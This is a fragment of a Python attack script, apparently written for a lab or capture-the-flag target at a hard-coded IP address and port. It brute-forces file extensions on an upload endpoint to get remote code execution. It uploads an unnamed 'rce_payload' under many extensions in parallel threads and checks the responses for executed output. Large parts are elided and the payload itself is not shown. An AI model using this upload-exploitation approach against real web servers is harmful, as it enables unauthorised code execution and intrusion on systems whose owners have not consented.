...
def upload_file(ext, rce_payload, upload_url, headers, proxies):
    """Upload a file with given extension and return result"""
    files = {
        'uploadFile': (ext, rce_payload, 'application/octet-stream')
    }
...
def check_rce(ext, image_url, proxies):
    ...
    try:
        ...
        if "<pre>" in rce_response.text:
            return ext, True, rce_url, rce_response.text
...
if __name__ == "__main__":
    ...
    base_url = 'http://94.237.57.211:59421'
    ...
    with ThreadPoolExecutor(max_workers=10) as executor:
        ...
        upload_futures = {
            executor.submit(upload_file, ext, rce_payload, upload_url, headers, proxies): ext 
